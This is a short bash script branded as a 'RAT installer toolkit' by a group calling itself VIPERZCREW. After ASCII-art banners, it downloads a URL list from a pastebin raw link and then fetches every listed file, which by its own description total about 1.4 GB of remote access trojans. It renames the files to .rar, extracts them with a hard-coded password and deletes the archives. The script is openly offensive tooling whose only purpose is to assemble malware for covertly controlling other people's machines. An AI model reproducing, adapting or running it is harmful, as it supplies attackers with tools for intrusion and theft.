#!/bin/bash

source="https://pastebin.com/raw/dWwp8mzg"
path=$(pwd)
clear
echo -e '\e[31;1m\t\t\t██████╗  █████╗ ████████╗'
echo -e '\t\t\t██╔══██╗██╔══██╗╚══██╔══╝'
echo -e '\t\t\t██████╔╝███████║   ██║'                                            
echo -e '\t\t\t██╔══██╗██╔══██║   ██║'                                               
echo -e '\t\t\t██║  ██║██║  ██║   ██║'                                                
echo -e '\t\t\t╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝'
                                                                      
echo '██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     ███████╗██████╗'
echo '██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     ██╔════╝██╔══██╗'
echo '██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     █████╗  ██████╔╝'
echo '██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     ██╔══╝  ██╔══██╗'
echo '██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗███████╗██║  ██║'
echo '╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝'

sleep 0.5                                                               
echo -e "\e[34;1m"
python <<< "import sys, os, time

ms0g = 'WELCOME TO THE RAT INSTALLER TOOLKIT BY VIPERZCREW\n\n'
for i in ms0g:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.05)"


if [ -d RATS ]; then
    echo -e "\e[34;1m[\e[36;1mi\e[34;1m] \e[32;1mDirectory found please wait."; sleep 0.5
else
    mkdir RATS
fi

echo -ne "\e[33;1mPress Enter To Install All RATS [\e[31;1m1,4GB\e[33;1m]>>> "
read enter

cd RATS;wget -O urls.txt $source
while read line; do wget $line; done < urls.txt
echo -e "\n\n\e[34;1m[\e[36;1mi\e[34;1m] \e[32;1mPre-praring..."; sleep 1.5

if ! hash rename 2>/dev/null;then
    sudo apt install rename renameutils -y 2>/dev/null
fi

rename 's/ /_/g' *
echo -e "\n\n\e[34;1m[\e[36;1mi\e[34;1m] \e[32;1mRenaming.."; sleep 0.5
for OUTPUT in $(ls); do mv $OUTPUT $OUTPUT.rar; done
echo -e "\n\n\e[34;1m[\e[36;1mi\e[34;1m] \e[32;1mExtractings...."; sleep 0.5
for file in *.rar; do unrar x -ptr -o+ ${file} 2>/dev/null; done
echo -e "\n\n\e[34;1m[\e[36;1mi\e[34;1m] \e[32;1mClearing..."; sleep 0.5
for file in *.rar; do rm -rf ${file} 2>/dev/null; done
echo -ne "\n\n\e[34;1m[\e[36;1mi\e[34;1m] \e[32;1mSuccessfully installed the RATs, press [ENTER] to quit>>>> "; sleep 0.5
read quit

# made by @mrblackx